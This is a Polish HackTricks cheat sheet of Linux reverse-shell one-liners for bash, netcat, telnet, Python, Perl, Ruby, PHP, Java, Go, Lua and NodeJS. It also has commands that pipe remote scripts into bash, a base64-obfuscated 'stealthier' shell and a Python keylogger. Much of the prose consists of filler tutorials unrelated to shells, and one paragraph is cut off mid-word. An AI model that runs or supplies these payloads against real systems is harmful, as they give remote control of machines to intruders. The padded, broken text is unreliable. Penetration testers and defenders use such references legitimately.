# Shells - Linux

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Jeśli masz pytania dotyczące któregokolwiek z tych shelli, możesz je sprawdzić na stronie** [**https://explainshell.com/**](https://explainshell.com)

## Pełny TTY

**Po uzyskaniu odwróconego shella**[ **przeczytaj tę stronę, aby uzyskać pełny TTY**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Nie zapomnij sprawdzić innych powłok: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.

### Bezpieczna powłoka symboli
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Wyjaśnienie powłoki

1. **`bash -i`**: Ta część polecenia uruchamia interaktywną (`-i`) powłokę Bash.
2. **`>&`**: Ta część polecenia jest skrótem do **przekierowania zarówno standardowego wyjścia** (`stdout`) jak i **standardowego błędu** (`stderr`) do **tego samego miejsca docelowego**.
3. **`/dev/tcp/<ADRES-ATAKUJĄCEGO>/<PORT>`**: Jest to specjalny plik, który **reprezentuje połączenie TCP z określonym adresem IP i portem**.
* Przez **przekierowanie strumieni wyjścia i błędów do tego pliku**, polecenie efektywnie wysyła wyjście z interaktywnej sesji powłoki na maszynę atakującego.
4. **`0>&1`**: Ta część polecenia **przekierowuje standardowe wejście (`stdin`) do tego samego miejsca docelowego co standardowe wyjście (`stdout`)**.

### Utwórz w pliku i wykonaj
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Jeśli napotkasz podatność **RCE** w aplikacji internetowej opartej na systemie Linux, może się zdarzyć, że **trudno będzie uzyskać odwróconą powłokę** ze względu na obecność reguł Iptables lub innych filtrów. W takich przypadkach rozważ utworzenie powłoki PTY w skompromitowanym systemie za pomocą potoków.

Kod można znaleźć pod adresem [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Musisz tylko zmodyfikować:

* Adres URL podatnego hosta
* Prefiks i sufiks twojego payloadu (jeśli istnieją)
* Sposób wysyłania payloadu (nagłówki? dane? dodatkowe informacje?)

Następnie możesz po prostu **wysyłać polecenia** lub nawet **użyć polecenia `upgrade`** do uzyskania pełnej powłoki PTY (należy zauważyć, że potoki są odczytywane i zapisywane z opóźnieniem około 1,3 s).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Sprawdź to na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet jest protokołem sieciowym, który umożliwia zdalne logowanie się do systemów komputerowych i wykonywanie poleceń. Może być używany do zdalnego zarządzania urządzeniami sieciowymi, takimi jak routery i przełączniki. 

Aby używać Telnet, musisz znać adres IP lub nazwę hosta urządzenia, do którego chcesz się połączyć. Następnie możesz otworzyć sesję Telnet, wpisując polecenie `telnet` w wierszu poleceń i podając adres IP lub nazwę hosta. 

Po nawiązaniu połączenia Telnet możesz zalogować się na zdalne urządzenie, podając odpowiednie dane uwierzytelniające, takie jak nazwa użytkownika i hasło. Po zalogowaniu możesz wykonywać polecenia na zdalnym urządzeniu, takie jak przeglądanie plików, uruchamianie programów lub konfigurowanie ustawień. 

Jednak Telnet ma pewne wady, które sprawiają, że jest niewskazany do użycia w środowiskach produkcyjnych. Przesyłane dane są przesyłane w postaci tekstowej, co oznacza, że ​​mogą być łatwo przechwycone i odczytane przez niepowołane osoby. Zamiast tego zaleca się korzystanie z bardziej bezpiecznych protokołów, takich jak SSH, które zapewniają szyfrowanie danych i bezpieczne uwierzytelnianie.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Atakujący**
```bash
while true; do nc -l <port>; done
```
Aby wysłać polecenie, zapisz je, naciśnij Enter, a następnie naciśnij CTRL+D (aby zatrzymać STDIN)

**Ofiara**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python jest popularnym językiem programowania, który może być używany do tworzenia różnych narzędzi i skryptów w celu ułatwienia procesu testowania penetracyjnego. Poniżej przedstawiam kilka przydatnych technik i narzędzi Pythona, które mogą być użyteczne podczas testowania penetracyjnego systemów Linux.

### Reverse Shell w Pythonie

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Keylogger w Pythonie

```python
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```

### Skaner portów w Pythonie

```python
import socket

target = "10.0.0.1"

def port_scan(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        return True
    except:
        return False

for port in range(1, 100):
    if port_scan(port):
        print(f"Port {port} is open")
    else:
        print(f"Port {port} is closed")
```

### Atak słownikowy w Pythonie

```python
import requests

target = "http://example.com"
wordlist = ["admin", "password", "123456"]

for word in wordlist:
    response = requests.get(target, auth=("admin", word))
    if response.status_code == 200:
        print(f"Found valid credentials: admin/{word}")
        break
    else:
        print(f"Invalid credentials: admin/{word}")
```

### Wysyłanie wiadomości e-mail w Pythonie

```python
import smtplib

def send_email(subject, body, to):
    from_addr = "your_email@gmail.com"
    password = "your_password"

    message = f"Subject: {subject}\n\n{body}"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_addr, password)
    server.sendmail(from_addr, to, message)
    server.quit()

send_email("Test", "This is a test email", "recipient@example.com")
```

### Analiza plików logów w Pythonie

```python
import re

log_file = "access.log"

def extract_ips(log_file):
    with open(log_file, "r") as f:
        log_data = f.read()

    ip_pattern = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    ips = re.findall(ip_pattern, log_data)

    return ips

ip_list = extract_ips(log_file)
for ip in ip_list:
    print(ip)
```

### Automatyzacja zadań w Pythonie

```python
import os

def run_command(command):
    os.system(command)

run_command("ls -la")
```

### Inne przydatne biblioteki Pythona

- `requests` - biblioteka do wykonywania zapytań HTTP
- `paramiko` - biblioteka do zarządzania połączeniami SSH
- `scapy` - biblioteka do tworzenia i wysyłania pakietów sieciowych
- `beautifulsoup4` - biblioteka do analizy i parsowania dokumentów HTML
- `pandas` - biblioteka do manipulacji danymi w formacie tabeli
- `numpy` - biblioteka do obliczeń naukowych i numerycznych
- `matplotlib` - biblioteka do tworzenia wykresów i wizualizacji danych

Python oferuje wiele narzędzi i bibliotek, które mogą być użyteczne podczas testowania penetracyjnego. Znajomość tych narzędzi i technik może znacznie ułatwić proces testowania i pomóc w identyfikacji potencjalnych luk w zabezpieczeniach systemów Linux.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl jest popularnym językiem skryptowym, który jest często wykorzystywany przez hakerów do wykonywania różnych zadań. Poniżej przedstawiam kilka przykładów użycia Perla w celach hakerskich:

### Reverse Shell z użyciem Perla

```perl
perl -e 'use Socket;$i="IP_ADRES";$p=PORT_NUMBER;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Ten skrypt Perla tworzy odwrócony shell, który łączy się z określonym adresem IP i numerem portu. Po nawiązaniu połączenia, otwiera standardowe wejście, wyjście i błąd, a następnie wykonuje powłokę systemową `/bin/sh -i`, umożliwiając hakerowi zdalne sterowanie nad komputerem docelowym.

### Wyszukiwanie wrażliwych plików

```perl
perl -MFile::Find -e 'find(sub{print $File::Find::name if -f and /SENSITIVE_FILE_REGEX/},"/")'
```

Ten skrypt Perla przeszukuje system plików, rozpoczynając od katalogu głównego ("/"), w poszukiwaniu plików, które pasują do określonego wyrażenia regularnego "SENSITIVE_FILE_REGEX". Znalezione pliki zostaną wyświetlone na ekranie.

### Atak słownikowy

```perl
perl -le 'print crypt("PASSWORD","SALT")'
```

Ten skrypt Perla generuje skrót hasła dla określonego hasła i soli. Może być używany do przeprowadzania ataków słownikowych, porównując wygenerowane skróty z zapisanymi wycieczkami.

### Inne zastosowania Perla

Perl ma wiele innych zastosowań w dziedzinie hakerskiej, takich jak manipulacja plikami, analiza logów, automatyzacja zadań i wiele innych. Jego potężne funkcje i elastyczność czynią go popularnym narzędziem w społeczności hakerskiej.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby jest dynamicznym, interpretowanym językiem programowania, który jest często używany do tworzenia aplikacji webowych. Ruby oferuje wiele przydatnych funkcji i bibliotek, które ułatwiają programowanie. Poniżej przedstawiam kilka przykładów, jak korzystać z Ruby w celu zautomatyzowania zadań i manipulowania danymi.

### Uruchamianie skryptów Ruby

Aby uruchomić skrypt Ruby, wystarczy wpisać polecenie `ruby` w terminalu, a następnie podać ścieżkę do pliku skryptu. Na przykład:

```ruby
ruby moj_skrypt.rb
```

### Manipulowanie plikami

Ruby oferuje wiele funkcji do manipulowania plikami. Możesz otworzyć plik, odczytać jego zawartość, zapisać dane do pliku i wiele więcej. Oto kilka przykładów:

```ruby
# Otwieranie pliku
plik = File.open("nazwa_pliku.txt", "r")

# Odczytywanie zawartości pliku
zawartosc = plik.read

# Zamykanie pliku
plik.close

# Zapisywanie danych do pliku
plik = File.open("nowy_plik.txt", "w")
plik.write("To jest nowa zawartość pliku.")
plik.close
```

### Wykonywanie poleceń systemowych

Ruby umożliwia wykonywanie poleceń systemowych bezpośrednio z poziomu skryptu. Możesz użyć metody `system` lub `exec` do wykonania polecenia. Oto przykłady:

```ruby
# Wykonanie polecenia systemowego
system("ls -l")

# Wykonanie polecenia systemowego i zakończenie działania skryptu
exec("ls -l")
```

### Przetwarzanie danych

Ruby oferuje wiele funkcji do przetwarzania danych. Możesz manipulować tekstami, sortować listy, filtrować dane i wiele więcej. Oto kilka przykładów:

```ruby
# Manipulowanie tekstami
tekst = "To jest przykładowy tekst."
tekst.upcase # Zmiana na wielkie litery
tekst.downcase # Zmiana na małe litery
tekst.reverse # Odwrócenie tekstu

# Sortowanie listy
lista = [5, 2, 8, 1, 9]
lista.sort # Sortowanie rosnąco
lista.sort.reverse # Sortowanie malejąco

# Filtrowanie danych
lista = [1, 2, 3, 4, 5]
lista.select { |liczba| liczba.even? } # Wybieranie parzystych liczb
```

To tylko kilka przykładów, jak można wykorzystać Ruby do automatyzacji zadań i manipulowania danymi. Ruby oferuje wiele innych funkcji i bibliotek, które mogą być przydatne w różnych scenariuszach.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP (Hypertext Preprocessor) jest popularnym językiem skryptowym, który jest szeroko stosowany do tworzenia stron internetowych. Poniżej przedstawiam kilka przydatnych technik i narzędzi związanych z PHP.

### 1. Wykonywanie kodu PHP z powłoki

Aby wykonać kod PHP z powłoki, można użyć polecenia `php -r`. Na przykład:

```bash
php -r 'echo "Hello, World!";'
```

### 2. Wykonywanie kodu PHP z pliku

Aby wykonać kod PHP z pliku, można użyć polecenia `php`. Na przykład:

```bash
php script.php
```

### 3. Wykonywanie kodu PHP w przeglądarce

Aby wykonać kod PHP w przeglądarce, należy skonfigurować serwer WWW, tak jak Apache, i umieścić plik PHP w katalogu serwera. Następnie można otworzyć plik PHP w przeglądarce, wpisując odpowiedni adres URL.

### 4. Wykonywanie kodu PHP w konsoli interaktywnej

Aby wykonać kod PHP w konsoli interaktywnej, można użyć polecenia `php -a`. Na przykład:

```bash
php -a
```

### 5. Debugowanie kodu PHP

Do debugowania kodu PHP można użyć narzędzi takich jak Xdebug, który umożliwia śledzenie wykonywania kodu, ustawianie punktów przerwania i analizę zmiennych.

### 6. Wykonywanie kodu PHP w tle

Aby wykonać kod PHP w tle, można użyć polecenia `php -f`. Na przykład:

```bash
php -f script.php &
```

### 7. Wykonywanie kodu PHP w systemie plików

Aby wykonać kod PHP w systemie plików, można użyć polecenia `php -l`. Na przykład:

```bash
php -l script.php
```

### 8. Wykonywanie kodu PHP w innych językach

Aby wykonać kod PHP w innych językach, można użyć narzędzi takich jak PHP/Java Bridge lub Quercus.

### 9. Wykonywanie kodu PHP w chmurze

Aby wykonać kod PHP w chmurze, można skorzystać z platformy chmurowej, takiej jak AWS Lambda lub Google Cloud Functions, które umożliwiają uruchamianie kodu PHP w odpowiedzi na zdarzenia.

### 10. Wykonywanie kodu PHP w kontenerach

Aby wykonać kod PHP w kontenerach, można skorzystać z narzędzi takich jak Docker, które umożliwiają uruchamianie aplikacji PHP w izolowanych środowiskach kontenerowych.

### 11. Wykonywanie kodu PHP na urządzeniach mobilnych

Aby wykonać kod PHP na urządzeniach mobilnych, można skorzystać z narzędzi takich jak Termux, które umożliwiają uruchamianie kodu PHP na smartfonach i tabletach.

### 12. Wykonywanie kodu PHP na zdalnych serwerach

Aby wykonać kod PHP na zdalnych serwerach, można skorzystać z narzędzi takich jak SSH, które umożliwiają zdalne logowanie i wykonywanie poleceń na serwerze.

### 13. Wykonywanie kodu PHP w środowisku testowym

Aby wykonać kod PHP w środowisku testowym, można skorzystać z narzędzi takich jak PHPUnit, które umożliwiają testowanie jednostkowe kodu PHP.

### 14. Wykonywanie kodu PHP w środowisku produkcyjnym

Aby wykonać kod PHP w środowisku produkcyjnym, należy skonfigurować serwer WWW, tak jak Nginx lub Apache, i umieścić pliki PHP w odpowiednich katalogach serwera.

### 15. Wykonywanie kodu PHP w środowisku rozwojowym

Aby wykonać kod PHP w środowisku rozwojowym, można skorzystać z narzędzi takich jak XAMPP lub WampServer, które umożliwiają uruchamianie serwera WWW i wykonywanie kodu PHP lokalnie.

### 16. Wykonywanie kodu PHP w środowisku wirtualnym

Aby wykonać kod PHP w środowisku wirtualnym, można skorzystać z narzędzi takich jak Vagrant lub VirtualBox, które umożliwiają tworzenie i zarządzanie wirtualnymi maszynami, na których można uruchamiać kod PHP.

### 17. Wykonywanie kodu PHP w środowisku bezpiecznym

Aby wykonać kod PHP w środowisku bezpiecznym, należy przestrzegać najlepszych praktyk programistycznych, takich jak unikanie niezaufanego wejścia, filtrowanie danych wejściowych i ograniczanie uprawnień dostępu do plików i funkcji.

### 18. Wykonywanie kodu PHP w środowisku skalowalnym

Aby wykonać kod PHP w środowisku skalowalnym, można skorzystać z narzędzi takich jak Kubernetes lub Docker Swarm, które umożliwiają zarządzanie i skalowanie aplikacji PHP w klastrze kontenerów.

### 19. Wykonywanie kodu PHP w środowisku bezdyskowym

Aby wykonać kod PHP w środowisku bezdyskowym, można skorzystać z narzędzi takich jak RAM-dysk lub tmpfs, które umożliwiają przechowywanie plików tymczasowych w pamięci RAM zamiast na dysku.

### 20. Wykonywanie kodu PHP w środowisku bezstanowym

Aby wykonać kod PHP w środowisku bezstanowym, należy unikać przechowywania stanu aplikacji na serwerze i korzystać z mechanizmów takich jak sesje lub tokeny uwierzytelniające do identyfikacji użytkowników.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java jest popularnym językiem programowania, który jest szeroko stosowany w tworzeniu aplikacji i oprogramowania. Jest to język obiektowy, który działa na platformie Java Virtual Machine (JVM). Java jest znana ze swojej przenośności, co oznacza, że ​​kod napisany w Javie może być uruchamiany na różnych systemach operacyjnych.

### Podstawy Javy

Oto kilka podstawowych pojęć związanych z Javą:

- **Klasa**: Klasa jest podstawową jednostką programową w Javie. Reprezentuje ona szablon lub wzorzec, na podstawie którego można tworzyć obiekty.
- **Obiekt**: Obiekt to instancja klasy. Może mieć swoje własne właściwości (zmienne) i zachowanie (metody).
- **Metoda**: Metoda to blok kodu, który wykonuje określone zadanie. Może przyjmować argumenty i zwracać wartość.
- **Zmienna**: Zmienna to miejsce w pamięci, w którym można przechowywać dane. Może mieć określony typ danych, takie jak liczba całkowita, zmiennoprzecinkowa, ciąg znaków itp.
- **Instrukcja warunkowa**: Instrukcja warunkowa pozwala na wykonanie różnych działań w zależności od spełnienia określonego warunku. Przykłady to instrukcje if-else i switch.
- **Pętla**: Pętla pozwala na wielokrotne wykonanie określonego bloku kodu. Przykłady to pętle for, while i do-while.

### Środowisko programistyczne Java

Aby rozpocząć programowanie w Javie, potrzebujesz odpowiedniego środowiska programistycznego (IDE). Oto kilka popularnych IDE dla Javy:

- **Eclipse**: Jest to darmowe i otwarte środowisko programistyczne, które oferuje wiele funkcji, takich jak automatyczne uzupełnianie kodu, debugowanie i zarządzanie projektem.
- **IntelliJ IDEA**: Jest to płatne środowisko programistyczne, które jest często uważane za jedno z najlepszych dla Javy. Oferuje wiele zaawansowanych funkcji i narzędzi.
- **NetBeans**: Jest to darmowe i otwarte środowisko programistyczne, które jest łatwe w użyciu i oferuje wiele funkcji, takich jak edytor kodu, debugowanie i projektowanie interfejsu użytkownika.

### Tworzenie aplikacji w Javie

Aby rozpocząć tworzenie aplikacji w Javie, musisz zrozumieć podstawy języka i mieć pewne umiejętności programistyczne. Oto kilka kroków, które możesz podjąć, aby rozpocząć:

1. Zainstaluj odpowiednie środowisko programistyczne dla Javy.
2. Naucz się podstawowych składni i konstrukcji języka Java.
3. Praktykuj tworzenie prostych programów, takich jak programy konsolowe.
4. Rozwijaj swoje umiejętności programistyczne, ucząc się bardziej zaawansowanych funkcji i technik programowania.
5. Twórz aplikacje, które wykorzystują różne biblioteki i frameworki Javy.

### Podsumowanie

Java jest potężnym językiem programowania, który jest szeroko stosowany w tworzeniu aplikacji i oprogramowania. Zrozumienie podstawowych pojęć i umiejętność korzystania z odpowiedniego środowiska programistycznego są kluczowe dla rozpoczęcia programowania w Javie. Praktyka i rozwijanie umiejętności programistycznych pozwolą Ci tworzyć coraz bardziej zaawansowane aplikacje.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat jest narzędziem do przesyłania danych przez sieć, które może być używane jako zamiennik tradycyjnego narzędzia netcat. Ncat oferuje wiele dodatkowych funkcji, takich jak szyfrowanie SSL, autoryzacja, tunelowanie sieciowe i wiele innych. Może być używany do nawiązywania połączeń TCP i UDP, a także do nasłuchiwania na określonych portach. Poniżej przedstawiono kilka przykładów użycia Ncat:

### Nawiązywanie połączenia TCP

Aby nawiązać połączenie TCP z określonym adresem IP i por
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua jest skryptowym językiem programowania, który jest często używany do rozszerzania funkcjonalności innych aplikacji. Może być używany jako język skryptowy w różnych środowiskach, takich jak gry komputerowe, aplikacje mobilne i serwery. Lua jest łatwy do nauki i ma prostą składnię, co czyni go popularnym wyborem dla programistów.

### Uruchamianie skryptów Lua

Aby uruchomić skrypt Lua, należy mieć zainstalowany interpreter Lua na swoim systemie. Można go pobrać ze strony oficjalnej Lua. Po zainstalowaniu interpretera Lua, można uruchomić skrypt za pomocą polecenia:

```
lua nazwa_skryptu.lua
```

### Podstawowe składniki języka Lua

Lua ma wiele podstawowych składników, które warto poznać. Oto kilka z nich:

- **Zmienne**: W Lua zmienne są dynamicznie typowane, co oznacza, że nie musisz deklarować ich typu. Możesz po prostu przypisać wartość do zmiennej i Lua automatycznie przypisze odpowiedni typ.

- **Tablice**: Tablice w Lua są indeksowane od 1 i mogą przechowywać różne typy danych, takie jak liczby, ciągi znaków i inne tablice.

- **Funkcje**: W Lua można tworzyć własne funkcje za pomocą słowa kluczowego `function`. Funkcje mogą przyjmować argumenty i zwracać wartości.

- **Warunki**: W Lua można używać instrukcji warunkowych, takich jak `if`, `else` i `elseif`, do wykonywania różnych działań w zależności od warunków.

- **Pętle**: Lua obsługuje pętle `for` i `while`, które umożliwiają wielokrotne wykonanie określonych instrukcji.

### Rozszerzanie aplikacji za pomocą Lua

Jednym z głównych zastosowań Lua jest rozszerzanie funkcjonalności innych aplikacji. Można to zrobić, dodając obsługę skryptów Lua do aplikacji i umożliwiając użytkownikom pisanie własnych skryptów w Lua. Dzięki temu użytkownicy mogą dostosowywać aplikację do swoich potrzeb i tworzyć nowe funkcje.

### Podsumowanie

Lua jest skryptowym językiem programowania, który jest często używany do rozszerzania funkcjonalności innych aplikacji. Ma prostą składnię i jest łatwy do nauki. Może być używany do tworzenia skryptów, rozszerzania aplikacji i wiele więcej.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS jest środowiskiem uruchomieniowym JavaScript opartym na silniku V8, który umożliwia uruchamianie kodu JavaScript poza przeglądarką internetową. Jest często wykorzystywany do tworzenia aplikacji sieciowych i serwerowych.

### Instalacja NodeJS

Aby zainstalować NodeJS, wykonaj następujące kroki:

1. Odwiedź stronę [NodeJS](https://nodejs.org) i pobierz najnowszą wersję dla swojego systemu operacyjnego.
2. Uruchom instalator i postępuj zgodnie z instrukcjami.
3. Po zakończeniu instalacji, sprawdź, czy NodeJS został poprawnie zainstalowany, wpisując w terminalu polecenie `node -v`. Powinieneś zobaczyć numer wersji NodeJS.

### Uruchamianie skryptów NodeJS

Aby uruchomić skrypt NodeJS, wykonaj następujące kroki:

1. Utwórz nowy plik o rozszerzeniu `.js` i zapisz w nim kod JavaScript.
2. W terminalu przejdź do katalogu, w którym znajduje się plik `.js`.
3. Uruchom skrypt, wpisując w terminalu polecenie `node nazwa_pliku.js`, gdzie `nazwa_pliku.js` to nazwa twojego pliku.

### Moduły NodeJS

NodeJS posiada wiele wbudowanych modułów, które umożliwiają rozszerzanie funkcjonalności aplikacji. Aby użyć modułu w skrypcie NodeJS, musisz go najpierw zaimportować. Oto przykład importowania modułu `fs`:

```javascript
const fs = require('fs');
```

### Tworzenie serwera HTTP w NodeJS

NodeJS umożliwia tworzenie serwerów HTTP za pomocą wbudowanego modułu `http`. Oto przykład tworzenia prostego serwera HTTP w NodeJS:

```javascript
const http = require('http');

const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello, World!');
});

server.listen(3000, 'localhost', () => {
  console.log('Server running at http://localhost:3000/');
});
```

### Podsumowanie

NodeJS jest potężnym narzędziem do tworzenia aplikacji sieciowych i serwerowych za pomocą JavaScript. Pozwala na uruchamianie kodu JavaScript poza przeglądarką internetową i oferuje wiele wbudowanych modułów, które ułatwiają rozwijanie aplikacji.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
